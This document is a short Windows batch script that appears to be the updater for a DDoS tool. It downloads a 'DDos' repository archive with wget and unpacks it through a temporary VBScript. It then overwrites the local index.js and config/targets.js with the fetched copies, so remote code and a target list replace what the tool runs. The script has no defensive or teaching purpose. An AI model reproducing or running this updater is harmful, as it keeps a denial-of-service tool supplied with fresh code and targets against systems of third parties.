@echo off
setlocal

rd /s /q .\DDos-master
del master.zip

echo Start download
wget.exe https://github.com/KT-71/DDos/archive/refs/heads/master.zip
Call :UnZipFile "%~dp0" "%~dp0master.zip"

xcopy .\DDos-master\index.js .\index.js /Y
xcopy .\DDos-master\config\targets.js .\config\targets.js

rd /s /q .\DDos-master
del master.zip

pause
exit /b


:UnZipFile <ExtractTo> <newzipfile>
set vbs="%temp%\_.vbs"
if exist %vbs% del /f /q %vbs%
>%vbs%  echo Set fso = CreateObject("Scripting.FileSystemObject")
>>%vbs% echo If NOT fso.FolderExists(%1) Then
>>%vbs% echo fso.CreateFolder(%1)
>>%vbs% echo End If
>>%vbs% echo set objShell = CreateObject("Shell.Application")
>>%vbs% echo set FilesInZip=objShell.NameSpace(%2).items
>>%vbs% echo objShell.NameSpace(%1).CopyHere(FilesInZip)
>>%vbs% echo Set fso = Nothing
>>%vbs% echo Set objShell = Nothing
cscript //nologo %vbs%
if exist %vbs% del /f /q %vbs%